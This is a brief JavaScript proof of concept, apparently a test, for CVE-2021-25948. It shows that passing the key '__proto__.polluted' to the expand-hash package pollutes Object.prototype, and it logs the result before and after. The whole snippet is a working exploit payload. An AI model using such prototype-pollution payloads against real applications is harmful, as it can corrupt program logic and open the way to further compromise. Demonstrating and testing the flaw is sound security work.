// //https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25948
// test("prototype pollution in expand-hash ", () => {
  var expandHash = require("expand-hash");
  var obj = {};

console.log({}.polluted);

  expandHash({ "__proto__.polluted": "yes" });

console.log({}.polluted);
// });
